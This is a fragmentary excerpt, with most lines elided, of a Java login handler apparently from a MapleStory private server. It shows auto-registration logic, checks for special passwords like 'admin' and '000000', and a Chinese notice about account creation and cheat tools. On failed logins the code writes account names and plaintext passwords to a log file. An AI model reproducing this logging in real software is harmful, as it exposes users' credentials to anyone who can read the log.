...
public class CharLoginHandler {
    ...
    public static final void login(final SeekableLittleEndianAccessor slea, final MapleClient c) {
        ...
        int loginok = 0;
        if (!Boolean.parseBoolean(ServerProperties.getProperty("RoyMS.AutoRegister")) || !AutoRegister.autoRegister
                || AutoRegister.getAccountExists(login) || banned) {
            ...
            if (loginok != 0) {
                ...
                FileoutputUtil.logToFile("logs/ACPW.txt", "ACC: " + login + " PW: " + pwd + " MAC : " + macData
        ...
        if (pwd.equalsIgnoreCase("disconnect") || pwd.equalsIgnoreCase("fixme") || pwd.equalsIgnoreCase("admin")
                || pwd.equalsIgnoreCase("000000")) {
        ...
        if (AutoRegister.success && AutoRegister.mac) {
            c.getSession().write(
                    MaplePacketCreator.serverNotice(1, "友情提示：账号创建成功,请尝试重新登录!\r\n拒绝一切第三方辅助程序\r\n提倡手动从我做起-举报开挂有奖\r\n！"));
